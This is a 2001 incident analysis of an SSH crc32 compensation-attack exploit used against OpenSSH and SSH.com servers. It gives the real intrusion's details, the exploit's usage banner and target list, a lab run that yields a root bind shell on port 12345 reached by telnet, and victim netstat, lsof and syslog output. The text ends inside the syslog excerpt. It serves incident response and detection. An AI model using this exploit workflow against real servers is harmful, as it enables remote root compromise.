@@ -1,0 +1,1202 @@
+
+
+    ==========================================================
+    Analysis of SSH crc32 compensation attack detector exploit
+    ==========================================================
+
+
+Copyright (C) 2001, David A. Dittrich <dittrich@cac.washington.edu>
+Thu Nov 15 06:28:02 PST 2001
+
+The most recent version of this file can be found at:
+
+	http://staff.washington.edu/dittrich/misc/ssh-analysis.txt
+
+
+Summary of incident
+===================
+
+On October 6, 2001, intruders originating from network blocks
+in the Netherlands used an exploit for the crc32 compensation attack
+detector vulnerability to remotely compromise a Red Hat Linux
+system on the UW network running OpenSSH 2.1.1.  This vulnerability is
+described in CERT Vulnerability note VU#945216:
+
+	http://www.kb.cert.org/vuls/id/945216
+
+Once in the system, a series of operating system commands were
+replaced with trojan horses to provide back doors for later entry
+and to conceal the presence of the intruders in the system.  A second
+SSH server was run on a high numbered port (39999/tcp).  The system
+was then used for broad scanning (outbound from the UW network) to
+identify more systems running OpenSSH 2.1.1, some of which were
+then attacked manually.
+
+Artifacts and logs were recovered from the system and analyzed.
+
+[NOTE: This particular exploit is presumed to be independent of any
+root kits or tool kits, so do not expect these same attributes to be
+present on all systems attacking with an SSH crc32 exploit.]
+
+The exploit is based on the source code for OpenSSH 2.2.0 (which
+is the follow on to version 2.1.1, and patched a vulnerability in the
+crc32 compensation attack detection function).  It is is actively being
+used against systems running OpenSSH 2.1.1 servers which suffer from
+this vulnerability, and has been successfully used against SSH.com
+version 1.2.31 as well.  (Other implementations of SSH protocol 1
+and versions have not been tested to date.)
+
+The analyzed exploit lists the following targets:
+
+	linux/x86 ssh.com 1.2.26-1.2.31 rhl
+	linux/x86 openssh 1.2.3 (maybe others)
+	linux/x86 openssh 2.2.0p1 (maybe others)
+	freebsd 4.x, ssh.com 1.2.26-1.2.31 rhl
+
+While this exploit shows multiple targets, the attackers in this case
+were only scanning for 22/tcp, then connecting to those systems that
+respond to get the server version and explicitly looking for only
+"OpenSSH_2.1.1".  These were rapid SYN scans, using a tool that
+comes with the t0rn root kit.
+
+Analysis of the compromised system revealed that 47067 addresses had
+been scanned (totalling 25386 unique hosts -- it is not clear why
+there is such a large overlap.)  Of the hosts scanned, 1244 vulnerable
+hosts were identified, and the intruders had successfully exploited
+and entered 4 hosts before the system was taken off-line on October 8.
+
+Other reports of 22/tcp scanning have come in since October 8, and it
+is believed that this exploit is circulating among IRC chat channels.
+
+The exploit does not work against systems that use access control
+restrictions (e.g., SSH.com's "AllowHosts" or "DenyHosts" settings)
+or packet level filters (e.g., ipchains, iptables, ipf) which would
+prevent a host from attempting to exchange public keys.  The
+vulnerability requires being able to enter cryptographic key exchange
+negotiation with the server to properly manipulate the stack.
+
+
+Background on the vulnerability and exploit
+===========================================
+
+This vulnerability was first announced by CORE-SDI in their advisory
+CORE-20010207, dated February 8, 2001:
+
+	http://www.securityfocus.com/advisories/3088
+
+Other advisories and bug descriptions are:
+
+	http://xforce.iss.net/alerts/advise100.php
+	http://razor.bindview.com/publish/advisories/adv_ssh1crc.html
+	http://www.securityfocus.com/bugid=2347
+
+On October 21, 2001, a thread was started by Jay Dyson on the
+incidents@securityfocus.com email list about scans for SSH servers
+originating from RIPE net blocks:
+
+	http://www.securityfocus.com/cgi-bin/archive.pl?id=75&start=2001-10-27&end=2001-11-02&mid=221998&threads=1
+
+Other groups have, or are working on, studies of scanning for
+22/tcp around the globe.
+
+A discussion on the vuln-dev@securityfocus.com email list prompted the
+following Newsbytes story about selling such an exploit for $1000:
+
+	Hackers Put A Price Tag On New Attack Tool
+	http://www.newsbytes.com/news/01/171291.html
+
+
+[NOTE:  The vulnerability is in the source code for SSH protocol 1,
+not for SSH on a particular hardware architecture.  Unconfirmed rumors
+exist that indicate shell code for Solaris 8/SPARC SSH.com 1.2.26-31
+may also exist, so ALL ARCHITECTURES should be considered potentially
+vulnerable, not just Linux/i386.]
+
+
+Vendor advisories, statements, and patch information
+====================================================
+
+	http://www.ssh.com/products/ssh/advisories/ssh1_crc-32.cfm
+	http://openssh.org/security.html
+	http://www.cisco.com/warp/public/707/SSH-multiple-pub.html
+
+
+Runtime analysis of the exploit
+===============================
+
+The exploit was tested on an isolated network segment, using a network
+address of 10.10.10.0/24, with attacking host using 10.10.10.10 and
+victim host using 10.10.10.3.
+
+The victim is running SSH.com's version 1.2.31 compiled on Red Hat
+Linux 6.0 (Kernel 2.2.16-3 on an i586).
+
+The attacking host was running Fred Cohen's PLAC[1] (CD-ROM bootable
+Linux 2.4.5 system, employing a ram disk for the root partition.)
+Files were copied onto the system using "nc" (Netcat)[2].
+
+This configuration allows some safety in the event the exploit (which
+was reviewed in a cursory fashion by "reqt" disassembly[3]) actually
+has some malicious code.  The non-routable network address and
+isolated subnet also prevent potential damage.
+
+
+Attacker's view
+===============
+
+When run with no arguments, the exploit presents the user with usage
+information:
+
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+root@plac /bin >> ./ssh
+
+
+linux/x86 sshd1 exploit by zip/TESO (zip@james.kalifornia.com) - ripped from
+openssh 2.2.0 src
+
+greets: mray, random, big t, sh1fty, scut, dvorak
+ps. this sploit already owned cia.gov :/
+
+**please pick a type**
+
+Usage: ./ssh host [options]
+Options:
+  -p port
+  -b base	Base address to start bruteforcing distance, by default 0x1800,
+goes as high as 0x10000
+  -t type
+  -d           debug mode
+  -o		Add this to delta_min
+
+types:
+
+0: linux/x86 ssh.com 1.2.26-1.2.31 rhl
+1: linux/x86 openssh 1.2.3 (maybe others)
+2: linux/x86 openssh 2.2.0p1 (maybe others)
+3: freebsd 4.x, ssh.com 1.2.26-1.2.31 rhl
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+[NOTE: Other versions of this exploit that are circulating have other
+options listed which affect the same hosts, but support a different
+back door port, in one case 3879/tcp, and require a special
+environment variable be set to protect execution (See the README file
+in Appendix B.) This may be a defensive mechanism against the exploit
+being stolen or discovered.]
+
+Our victim system is running SSH.com version 1.2.31 (unpatched)
+on port 2222, with syslog logging directed to a separate file
+("sshdx.log", excerpts shown below).
+
+We select type 0 and attack our server on port 2222:
+
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+root@plac /bin >> ./ssh 10.10.10.3 -p 2222 -t 0
+
+
+linux/x86 sshd1 exploit by zip/TESO (zip@james.kalifornia.com) - ripped from
+openssh 2.2.0 src
+
+greets: mray, random, big t, sh1fty, scut, dvorak
+ps. this sploit already owned cia.gov :/
+
+...........................
+bruteforced distance: 0x3200
+bruteforcing distance from h->partial packet buffer on stack
+..............^[[A................|////////\\\\!
+bruteforced h->ident buff distance: 5bfbed88
+
+trying retloc_delta: 35
+....!
+found high words of possible return address: 808
+trying to exploit
+....
+trying retloc_delta: 37
+.!
+found high words of possible return address: 805
+trying to exploit
+....
+trying retloc_delta: 39
+......
+trying retloc_delta: 3b
+......
+trying retloc_delta: 3d
+!
+found high words of possible return address: 804
+trying to exploit
+....
+trying retloc_delta: 3f
+......
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+At this point, the exploit tool appears to "hang".  Switching to the
+victim system, things have changed.
+
+
+
+Victim's view
+==============
+
+Prior to the exploit, the victim system shows the standard SSH daemon
+on port 22/tcp, and our vulnerable daemon on port 2222/tcp.  Both are
+listening, and the standard SSH daemon has one incoming connection
+(10.10.10.2:33354):
+
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[root@victim /root]# netstat -an --inet
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 10.10.10.3:2222         0.0.0.0:*               LISTEN      
+tcp        0      0 10.10.10.3:22           10.10.10.2:33354        ESTABLISHED 
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
+raw        0      0 0.0.0.0:1               0.0.0.0:*               7           
+raw        0      0 0.0.0.0:6               0.0.0.0:*               7           
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+After the above exploit had run to the point of the apparent "hang",
+a new listening service port is now visible on 12345/tcp:
+
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[root@victim /root]# netstat -an --inet
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:12345           0.0.0.0:*               LISTEN      
+tcp        0      0 10.10.10.3:2222         10.10.10.10:32965       ESTABLISHED 
+tcp        0      0 10.10.10.3:2222         0.0.0.0:*               LISTEN      
+tcp        0      0 10.10.10.3:22           10.10.10.2:33354        ESTABLISHED 
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
+raw        0      0 0.0.0.0:1               0.0.0.0:*               7           
+raw        0      0 0.0.0.0:6               0.0.0.0:*               7           
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+During a second "attack", a netstat is run.  During the attack
+window, the multiple brute force attack attempts are visible:
+
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[root@victim /root]# netstat -an --inet
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:12345           0.0.0.0:*               LISTEN      
+tcp     1252      0 10.10.10.3:2222         10.10.10.10:33076       ESTABLISHED 
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33075       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33074       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33072       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33071       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33069       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33067       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33066       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33064       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33063       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33062       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33061       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33060       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33059       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33058       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33056       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33055       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33053       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33051       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33050       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33048       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33047       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33046       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33042       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33041       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33040       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33039       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33038       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33036       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33035       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33034       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33033       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33032       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33030       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33029       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33028       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33027       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33024       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33023       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33022       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33021       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33020       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33016       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         10.10.10.10:33014       TIME_WAIT   
+tcp        0      0 10.10.10.3:2222         0.0.0.0:*               LISTEN      
+tcp        0      0 10.10.10.3:22           10.10.10.2:33354        ESTABLISHED 
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
+raw        0      0 0.0.0.0:1               0.0.0.0:*               7           
+raw        0      0 0.0.0.0:6               0.0.0.0:*               7           
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+LiSt Open Files ("lsof")[4] shows the vulnerable SSH daemon has now
+opened a new listening port:
+
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[root@victim /root]# lsof -p 9364
+COMMAND  PID USER   FD   TYPE DEVICE    SIZE   NODE NAME
+sshd    9364 root  cwd    DIR    3,3    1024      2 /
+sshd    9364 root  rtd    DIR    3,3    1024      2 /
+sshd    9364 root  txt    REG    3,3  655038 442413 /usr/local/src/ssh-1.2.31/sbin/sshd1
+sshd    9364 root  mem    REG    3,3  340771  30722 /lib/ld-2.1.3.so
+sshd    9364 root  mem    REG    3,3  370141  31107 /lib/libnsl-2.1.3.so
+sshd    9364 root  mem    REG    3,3   66231  31103 /lib/libcrypt-2.1.3.so
+sshd    9364 root  mem    REG    3,3   47008  31113 /lib/libutil-2.1.3.so
+sshd    9364 root  mem    REG    3,3 4101836  31102 /lib/libc-2.1.3.so
+sshd    9364 root  mem    REG    3,3  246652  31109 /lib/libnss_files-2.1.3.so
+sshd    9364 root  mem    REG    3,3  252234  31111 /lib/libnss_nisplus-2.1.3.so
+sshd    9364 root  mem    REG    3,3  255963  31110 /lib/libnss_nis-2.1.3.so
+sshd    9364 root  mem    REG    3,3   67580  31108 /lib/libnss_dns-2.1.3.so
+sshd    9364 root  mem    REG    3,3  169720  31112 /lib/libresolv-2.1.3.so
+sshd    9364 root    0u   CHR    1,3           4110 /dev/null
+sshd    9364 root    1u   CHR    1,3           4110 /dev/null
+sshd    9364 root    2u   CHR    1,3           4110 /dev/null
+sshd    9364 root    3u  inet  10202            TCP *:12345 (LISTEN)
+sshd    9364 root    4u  inet  10197            TCP 10.10.10.3:2222->10.10.10.10:33190 (CLOSE_WAIT)
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+A successful exploit
+====================
+
+Now comes the fun part.  The exploit does the typical "bind a shell
+to a high-numbered TCP port" trick, which also is visible in
+"netstat" output (12345/tcp):
+
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[root@victim /root]# netstat -an --inet
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 10.10.10.3:12345        10.10.10.10:33077       ESTABLISHED 
+tcp        0      0 0.0.0.0:12345           0.0.0.0:*               LISTEN      
+tcp     1252      0 10.10.10.3:2222         10.10.10.10:33076       ESTABLISHED 
+tcp        0      0 10.10.10.3:2222         0.0.0.0:*               LISTEN      
+tcp        0      0 10.10.10.3:22           10.10.10.2:33354        ESTABLISHED 
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
+raw        0      0 0.0.0.0:1               0.0.0.0:*               7           
+raw        0      0 0.0.0.0:6               0.0.0.0:*               7           
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+All that is necessary is for the attacker to then use "telnet" or "nc"
+(Netcat) to connect to this port and start executing commands from the
+shell (it is necessary to end each command line with a semi-colon --
+see Appendix B), or to pipe commands from a shell script (this
+automation method is common, e.g. as seen in the analysis of trin00
+published in 1999 in connection with DDoS attacks using that tool.)
+
+[NOTE: Feedback from a reviewer of this analysis indicates that if you
+use "nc" to connect to the back door port, rather than "telnet", you
+don't need to terminate commands to the shell with semicolons.  Nc
+adds in the newline character that the shell recognizes as a command
+terminator.]
+
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+root@plac ~ >> telnet 10.10.10.3 12345
+Trying 10.10.10.3...
+Connected to 10.10.10.3.
+Escape character is '^]'.
+id;
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+date;
+Thu Nov  1 18:04:42 PST 2001
+netstat -an --inet;
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 10.10.10.3:12345        10.10.10.10:33077       ESTABLISHED 
+tcp        0      0 0.0.0.0:12345           0.0.0.0:*               LISTEN      
+tcp     1252      0 10.10.10.3:2222         10.10.10.10:33076       ESTABLISHED 
+tcp        0      0 10.10.10.3:2222         0.0.0.0:*               LISTEN      
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
+raw        0      0 0.0.0.0:1               0.0.0.0:*               7           
+raw        0      0 0.0.0.0:6               0.0.0.0:*               7           
+exit;
+Connection closed by foreign host.
+root@plac ~ >>
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+Once the attacker exits the shell, things on the victim system go back
+to normal:
+
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[root@victim /root]# netstat -an --inet
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 10.10.10.3:2222         0.0.0.0:*               LISTEN      
+tcp        0      0 10.10.10.3:22           10.10.10.2:33354        ESTABLISHED 
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
+raw        0      0 0.0.0.0:1               0.0.0.0:*               7           
+raw        0      0 0.0.0.0:6               0.0.0.0:*               7           
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+If syslog logging is enabled, the connections and brute force attempts
+are quite visible (remember, this is stock SSH.com 1.2.31 on
+Red Hat Linux 6.0 -- with OpenSSH you would only see the 'fatal:'
+messages, the 'Connection from' will not be displayed in the default
+configuration.)
+
+ =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Nov  1 18:46:14 victim sshd[9510]: log: Connection from 10.10.10.10 port 33298
+Nov  1 18:46:19 victim sshd[9511]: log: Connection from 10.10.10.10 port 33299
+Nov  1 18:46:22 victim sshd[9512]: log: Connection from 10.10.10.10 port 33300
+Nov  1 18:46:26 victim sshd[9513]: log: Connection from 10.10.10.10 port 33301
+Nov  1 18:46:31 victim sshd[9515]: log: Connection from 10.10.10.10 port 33302
+Nov  1 18:46:35 victim sshd[9516]: log: Connection from 10.10.10.10 port 33303
+Nov  1 18:46:39 victim sshd[9517]: log: Connection from 10.10.10.10 port 33304
+Nov  1 18:46:43 victim sshd[9518]: log: Connection from 10.10.10.10 port 33305
+Nov  1 18:46:47 victim sshd[9518]: fatal: Local: Corrupted check bytes on input.
+Nov  1 18:46:47 victim sshd[9519]: log: Connection from 10.10.10.10 port 33306
+Nov  1 18:46:52 victim sshd[9519]: fatal: Connection closed by remote host.
+Nov  1 18:46:53 victim sshd[9520]: log: Connection from 10.10.10.10 port 33307
+Nov  1 18:46:57 victim sshd[9521]: log: Connection from 10.10.10.10 port 33308
+Nov  1 18:47:01 victim sshd[9522]: log: Connection from 10.10.10.10 port 33309
+Nov  1 18:47:06 victim sshd[9523]: log: Connection from 10.10.10.10 port 33310
+Nov  1 18:47:10 victim sshd[9524]: log: Connection from 10.10.10.10 port 33311
+Nov  1 18:47:14 victim sshd[9525]: log: Connection from 10.10.10.10 port 33312
+Nov  1 18:47:19 victim sshd[9526]: log: Connection from 10.10.10.10 port 33313
+Nov  1 18:47:24 victim sshd[9527]: log: Connection from 10.10.10.10 port 33314
+Nov  1 18:47:24 victim sshd[9527]: fatal: Connection closed by remote host.
+Nov  1 18:47:46 victim sshd[9528]: log: Connection from 10.10.10.10 port 33315
+Nov  1 18:47:46 victim sshd[9529]: log: Connection from 10.10.10.10 port 33316
+Nov  1 18:47:47 victim sshd[9530]: log: Connection from 10.10.10.10 port 33317
+Nov  1 18:47:47 victim sshd[9531]: log: Connection from 10.10.10.10 port 33318
+Nov  1 18:47:47 victim sshd[9532]: log: Connection from 10.10.10.10 port 33319
+Nov  1 18:47:48 victim sshd[9533]: log: Connection from 10.10.10.10 port 33320
+Nov  1 18:47:48 victim sshd[9534]: log: Connection from 10.10.10.10 port 33321
+Nov  1 18:47:48 victim sshd[9535]: log: Connection from 10.10.10.10 port 33322
+Nov  1 18:47:49 victim sshd[9536]: log: Connection from 10.10.10.10 port 33323
+Nov  1 18:47:49 victim sshd[9537]: log: Connection from 10.10.10.10 port 33324
+Nov  1 18:47:50 victim sshd[9538]: log: Connection from 10.10.10.10 port 33325
+Nov  1 18:47:50 victim sshd[9539]: log: Connection from 10.10.10.10 port 33326
+Nov  1 18:47:50 victim sshd[9540]: log: Connection from 10.10.10.10 port 33327
+Nov  1 18:47:51 victim sshd[9541]: log: Connection from 10.10.10.10 port 33328
+Nov  1 18:47:51 victim sshd[9542]: log: Connection from 10.10.10.10 port 33329
+Nov  1 18:47:51 victim sshd[9543]: log: Connection from 10.10.10.10 port 33330
+Nov  1 18:47:52 victim sshd[9544]: log: Connection from 10.10.10.10 port 33331
+Nov  1 18:47:52 victim sshd[9545]: log: Connection from 10.10.10.10 port 33332
+Nov  1 18:47:52 victim sshd[9546]: log: Connection from 10.10.10.10 port 33333
+Nov  1 18:47:53 victim sshd[9547]: log: Connection from 10.10.10.10 port 33334
+Nov  1 18:47:53 victim sshd[9548]: log: Connection from 10.10.10.10 port 33335
+Nov  1 18:47:54 victim sshd[9549]: log: Connection from 10.10.10.10 port 33336
+Nov  1 18:47:54 victim sshd[9550]: log: Connection from 10.10.10.10 port 33337
+Nov  1 18:47:54 victim sshd[9551]: log: Connection from 10.10.10.10 port 33338
+Nov  1 18:47:55 victim sshd[9552]: log: Connection from 10.10.10.10 port 33339
+Nov  1 18:47:55 victim sshd[9553]: log: Connection from 10.10.10.10 port 33340
+Nov  1 18:47:55 victim sshd[9554]: log: Connection from 10.10.10.10 port 33341
+Nov  1 18:47:56 victim sshd[9555]: log: Connection from 10.10.10.10 port 33342
+Nov  1 18:47:56 victim sshd[9556]: log: Connection from 10.10.10.10 port 33343
+Nov  1 18:47:56 victim sshd[9555]: fatal: Local: Corrupted check bytes on input.
+Nov  1 18:47:57 victim sshd[9557]: log: Connection from 10.10.10.10 port 33344
+Nov  1 18:47:57 victim sshd[9558]: log: Connection from 10.10.10.10 port 33345
+Nov  1 18:47:57 victim sshd[9559]: log: Connection from 10.10.10.10 port 33346
+Nov  1 18:47:58 victim sshd[9560]: log: Connection from 10.10.10.10 port 33347
+Nov  1 18:47:58 victim sshd[9561]: log: Connection from 10.10.10.10 port 33348
+Nov  1 18:47:59 victim sshd[9562]: log: Connection from 10.10.10.10 port 33349
+Nov  1 18:47:59 victim sshd[9563]: log: Connection from 10.10.10.10 port 33350
+Nov  1 18:47:59 victim sshd[9564]: log: Connection from 10.10.10.10 port 33351
+Nov  1 18:48:00 victim sshd[9565]: log: Connection from 10.10.10.10 port 33352
+Nov  1 18:48:00 victim sshd[9566]: log: Connection from 10.10.10.10 port 33353
+Nov  1 18:48:00 victim sshd[9567]: log: Connection from 10.10.10.10 port 33354
+Nov  1 18:48:01 victim sshd[9568]: log: Connection from 10.10.10.10 port 33355
+Nov  1 18:48:01 victim sshd[9569]: log: Connection from 10.10.10.10 port 33356
+Nov  1 18:48:02 victim sshd[9570]: log: Connection from 10.10.10.10 port 33357
+Nov  1 18:48:02 victim sshd[9571]: log: Connection from 10.10.10.10 port 33358
+Nov  1 18:48:02 victim sshd[9572]: log: Connection from 10.10.10.10 port 33359
+Nov  1 18:48:03 victim sshd[9573]: log: Connection from 10.10.10.10 port 33360
+Nov  1 18:48:03 victim sshd[9574]: log: Connection from 10.10.10.10 port 33361
+Nov  1 18:48:03 victim sshd[9575]: log: Connection from 10.10.10.10 port 33362
+Nov  1 18:48:04 victim sshd[9576]: log: Connection from 10.10.10.10 port 33363
+Nov  1 18:48:04 victim sshd[9577]: log: Connection from 10.10.10.10 port 33364
+Nov  1 18:48:04 victim sshd[9578]: log: Connection from 10.10.10.10 port 33365
+Nov  1 18:48:05 victim sshd[9579]: log: Connection from 10.10.10.10 port 33366
+Nov  1 18:48:05 victim sshd[9580]: log: Connection from 10.10.10.10 port 33367
+Nov  1 18:48:06 victim sshd[9581]: log: Connection from 10.10.10.10 port 33368
+Nov  1 18:48:06 victim sshd[9582]: log: Connection from 10.10.10.10 port 33369
+Nov  1 18:48:06 victim sshd[9583]: log: Connection from 10.10.10.10 port 33370
+Nov  1 18:48:07 victim sshd[9584]: log: Connection from 10.10.10.10 port 33371
+Nov  1 18:48:07 victim sshd[9585]: log: Connection from 10.10.10.10 port 33372
+Nov  1 18:48:07 victim sshd[9586]: log: Connection from 10.10.10.10 port 33373
+Nov  1 18:48:08 victim sshd[9587]: log: Connection from 10.10.10.10 port 33374
+Nov  1 18:48:08 victim sshd[9586]: fatal: Local: crc32 compensation attack: network attack detected
+Nov  1 18:48:08 victim sshd[9588]: log: Connection from 10.10.10.10 port 33375
+Nov  1 18:48:08 victim sshd[9587]: fatal: Local: crc32 compensation attack: network attack detected
+Nov  1 18:48:08 victim sshd[9589]: log: Connection from 10.10.10.10 port 33376
+Nov  1 18:48:08 victim sshd[9588]: fatal: Local: crc32 compensation attack: network attack detected
+Nov  1 18:48:09 victim sshd[9590]: log: Connection from 10.10.10.10 port 33377
+Nov  1 18:48:09 victim sshd[9589]: fatal: Local: crc32 compensation attack: network attack detected
+Nov  1 18:48:09 victim sshd[9591]: log: Connection from 10.10.10.10 port 33378
+Nov  1 18:48:09 victim sshd[9590]: fatal: Local: crc32 compensation attack: network attack detected
+Nov  1 18:48:09 victim sshd[9592]: log: Connection from 10.10.10.10 port 33379
+Nov  1 18:48:09 victim sshd[9591]: fatal: Local: crc32 compensation attack: network attack detected
+Nov  1 18:48:10 victim sshd[9592]: fatal: Local: crc32 compensation attack: network attack detected
+Nov  1 18:48:10 victim sshd[9593]: log: Connection from 10.10.10.10 port 33380
+Nov  1 18:48:10 victim sshd[9594]: log: Connection from 10.10.10.10 port 33381
+Nov  1 18:48:10 victim sshd[9593]: fatal: Local: crc32 compensation attack: network attack detected
+Nov  1 18:48:11 victim sshd[9595]: log: Connection from 10.10.10.10 port 33382
+Nov  1 18:48:11 victim sshd[9594]: fatal: Local: crc32 compensation attack: network attack detected
+Nov  1 18:48:11 victim sshd[9596]: log: Connection from 10.10.10.10 port 33383
+Nov  1 18:48:11 victim sshd[9597]: log: Connection from 10.10.10.10 port 33384
+Nov  1 18:48:11 victim sshd[9596]: fatal: Local: crc32 compensation attack: network attack detected
+Nov  1 18:48:12 victim sshd[9598]: log: Connection from 10.10.10.10 port 33385
+Nov  1 18:48:12 victim sshd[9597]: fatal: Local: crc32 compensation attack: network attack detected
+Nov  1 18:48:12 victim sshd[9599]: log: Connection from 10.10.10.10 port 33386
+Nov  1 18:48:12 victim sshd[9598]: fatal: Local: crc32 compensation attack: network attack detected
+Nov  1 18:48:12 victim sshd[9600]: log: Connection from 10.10.10.10 port 33387
+Nov  1 18:48:12 victim sshd[9599]: fatal: Local: crc32 compensation attack: network attack detected
+Nov  1 18:48:13 victim sshd[9601]: log: Connection from 10.10.10.10 port 33388
+Nov  1 18:48:13 victim sshd[9602]: log: Connection from 10.10.10.10 port 33389
+Nov  1 18:48:13 victim sshd[9603]: log: Connection from 10.10.10.10 port 33390
+Nov  1 18:48:14 victim sshd[9604]: log: Connection from 10.10.10.10 port 33391
+Nov  1 18:48:14 victim sshd[9605]: log: Connection from 10.10.10.10 port 33392
